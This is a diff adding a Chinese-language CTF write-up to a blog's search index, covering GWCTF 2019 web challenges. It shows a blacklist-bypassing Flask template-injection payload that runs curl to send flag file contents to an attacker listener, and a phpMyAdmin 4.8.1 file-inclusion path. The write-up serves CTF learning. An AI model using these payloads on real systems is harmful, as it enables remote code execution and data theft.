@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>gwctf2019</title>
+      <link href="/2020/10/21/gwctf2019/"/>
+      <url>/2020/10/21/gwctf2019/</url>
+      
+        <content type="html"><![CDATA[<p>题目<a href="https://github.com/gwht/2019GWCTF/tree/master/wp/web/" target="_blank" rel="noopener">https://github.com/gwht/2019GWCTF/tree/master/wp/web/</a></p><a id="more"></a><p>简略安装教程:将题目git clone到服务器/虚拟机</p><p>1.1如果题目有<code>docker-compose.yml</code>文件</p><blockquote><p>docker-compose builddocker-compose up -d</p></blockquote><p>1.2如果没有上述文件,只有dockerfile</p><blockquote><p>docker build -t xxx      #创建镜像docker run -id -P xxx    #创建容器</p></blockquote><p>2.使用命令查看映射端口</p><blockquote><p>docker ps</p></blockquote><p>*如果服务器/虚拟机搭建出错,可以去BUUCTF平台做</p><h1 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h1><p>开始以为是sql注入,简单尝试后无果</p><p>查看响应头发现有python字样</p><img src="/2020/10/21/gwctf2019/uname2.png"><p>看到这个我想到的是flask</p><p>可能是ssti,搜索flask漏洞</p><p>发现有很多大佬关于模板漏洞的文章</p><p><a href="https://www.cnblogs.com/Rasang/p/12181654.html" target="_blank" rel="noopener">Python——flask漏洞探究–PlumK</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">python-flask-ssti(模版注入漏洞)–晓枫</a></p><p><a href="https://blog.csdn.net/kuller_Yan/article/details/105399371" target="_blank" rel="noopener">Python——flask漏洞探究总结（持续更新）–kuller_Yan</a></p><p><a href="https://blog.csdn.net/qq_40657585/article/details/83657220" target="_blank" rel="noopener">SSTI (服务器模板注入)–Hydra.</a></p><p><a href="http://www.likecs.com/show-103312.html" target="_blank" rel="noopener">SSTI(服务器模板注入)学习–Xy–1</a>有具体解释这些类的含义</p><ul><li>总的思路就是从一个内置变量调用<code>__class__.base__</code>等隐藏属性，去找到一个函数，然后调用其__globals[‘builtins’]即可调用eval等执行任意代码</li></ul><p>这题还过滤了class、config、if等敏感字符且不能重写绕过</p><p>但可以用claifss来表达class，其他同理(也有大佬说这种黑名单要用靠后的词进行混淆过滤,因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个config被替换之后，过滤也就结束了)</p><p>还有另一个强过滤是匹配，在使用{ {7*7} }直接报错，而且报的是php的错，wp有说加了个php模式的报错和index.php路由</p><p>payload</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf ''.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclasconfigses__()[<span class="number">59</span>].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen(<span class="name">'curl</span> http://yourip:port/ -d cat /flag_1s_Hera;') %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><p>即</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ''.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="name">'curl</span> ip:port/ -d ls / | grep flag;') %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>*需要在服务器监听某个端口</p><h1 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h1><p>用dirsearch扫后台</p><p>扫到robots.txt/phpinfo.php/phpmyadmin</p><p>进入robots.txt,提示禁止访问phpinfo.php,访问phpinfo.php没什么发现</p><p>访问phgmyadmin,连登录都不需要就直接进入后台</p><p>点一轮没什么发现,发现phpmyadmin版本为4.8.1,问搜索引擎</p><p><a href="https://xz.aliyun.com/t/6592" target="_blank" rel="noopener">先知社区CVE-2018-12613 phpMyAdmin远程文件包含漏洞–ghtwf01</a></p><blockquote><p>?target=db_datadict.php%253f/../../../../../flag</p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>docker</title>
       <link href="/2020/06/21/docker/"/>
       <url>/2020/06/21/docker/</url>
